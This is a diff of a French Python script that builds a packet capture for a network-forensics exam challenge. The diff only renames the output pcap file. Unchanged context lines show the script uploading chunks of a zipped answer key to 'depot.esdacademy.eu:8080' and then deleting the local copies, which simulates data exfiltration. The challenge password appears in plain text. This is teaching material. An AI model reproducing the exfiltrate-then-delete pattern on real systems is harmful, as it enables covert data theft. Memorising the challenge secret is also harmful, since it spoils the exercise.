@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-# Pour regenerer capture.pcap (3 terminaux, depuis ce dossier) :
+# Pour regenerer Challenge_Exfiltration_ESD.pcap (3 terminaux, depuis ce dossier) :
 #   1) python3 server.py
-#   2) sudo tcpdump -i lo -w capture.pcap port 8080
+#   2) sudo tcpdump -i lo -w Challenge_Exfiltration_ESD.pcap port 8080
 #   3) python3 build.py
-# Ensuite Ctrl+C sur le terminal 2 : capture.pcap est pret dans ce dossier.
+# Ensuite Ctrl+C sur le terminal 2 : Challenge_Exfiltration_ESD.pcap est pret dans ce dossier.
 import base64, os, subprocess, http.client, shutil
 
 MOT_DE_PASSE = "Exam3n_Blanc_NESD_006"
@@ -53,4 +53,4 @@ envoyer("depot.esdacademy.eu:8080", "POST", "/upload/2", morceau_2)
 
 os.remove("corrige_examen.txt")
 os.remove("corrige.zip")
-print("Trafic genere. Arretez tcpdump : capture.pcap est pret dans ce dossier.")
+print("Trafic genere. Arretez tcpdump : Challenge_Exfiltration_ESD.pcap est pret dans ce dossier.")
